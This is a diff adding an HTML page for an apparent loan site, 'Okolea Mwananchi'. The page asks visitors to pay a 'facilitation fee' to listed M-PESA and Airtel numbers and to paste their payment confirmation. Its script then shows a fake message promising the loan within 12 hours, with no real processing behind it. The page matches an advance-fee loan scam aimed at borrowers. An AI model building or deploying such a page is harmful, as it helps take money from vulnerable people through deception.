@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Facility Fee Payment - Okolea Mwananchi</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background: url('images/handing.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    /* Updated overlay with darker background */
+    .overlay {
+      background: rgba(0, 0, 0, 0.5);  /* Darker overlay */
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: #fff;
+      max-width: 600px;
+      width: 90%;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+    }
+    h2, h3 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    p {
+      text-align: center;
+      font-size: 1.1em;
+      margin-bottom: 20px;
+    }
+    .cta-button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1.1em;
+      text-decoration: none;
+      display: block;
+      width: 220px;
+      margin: 20px auto;
+      transition: background-color 0.3s ease;
+    }
+    .cta-button:hover {
+      background-color: #45a049;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    #confirmationMessage {
+      text-align: center;
+      font-size: 1.2em;
+      font-weight: bold;
+      color: green;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="container">
+      <h2>Facility Fee Payment</h2>
+      <p>To receive your qualified amount, click Proceed below.</p>
+      <button id="proceedButton" class="cta-button">Proceed</button>
+      
+      <div id="paymentDetails" style="display: none;">
+        <h3><strong>Payment Instructions</strong></h3>
+        <p><strong>TREASURER M-PESA NO: 254757396782<br>
+        AIRTEL NO: 254734401527</strong></p>
+        <p><strong>Any problem, contact us at WhatsApp NO: +254757396782<br>
+        or email: mwananchihuslerloans@gmail.com</strong></p>
+        
+        <div class="input-group">
+          <label for="paymentReceiver">Where do you want to receive your qualified amount? (Enter details here):</label>
+          <input type="text" id="paymentReceiver" name="paymentReceiver" placeholder="e.g., Mobile Money Number or PayPal Email" required>
+        </div>
+        
+        <div class="input-group">
+          <label for="paymentConfirmation">Paste the FACILITATION FEE payment confirmation message here paid to the treasurer's details above:</label>
+          <textarea id="paymentConfirmation" name="paymentConfirmation" rows="4" placeholder="Paste your payment confirmation message here" required></textarea>
+        </div>
+        
+        <button id="completeButton" class="cta-button">Complete Submission</button>
+      </div>
+      
+      <div id="confirmationMessage" style="display: none;">
+        <p>Thank you, we have received your application. You should receive your qualified amount in less than 12 hours.</p>
+        <a href="summary.html" class="cta-button">View Loan Summary</a>
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    const proceedButton = document.getElementById('proceedButton');
+    const paymentDetails = document.getElementById('paymentDetails');
+    const completeButton = document.getElementById('completeButton');
+    const confirmationMessage = document.getElementById('confirmationMessage');
+
+    proceedButton.addEventListener('click', () => {
+      paymentDetails.style.display = 'block';
+      proceedButton.style.display = 'none';
+    });
+
+    completeButton.addEventListener('click', () => {
+      paymentDetails.style.display = 'none';
+      confirmationMessage.style.display = 'block';
+    });
+  </script>
+</body>
+</html>
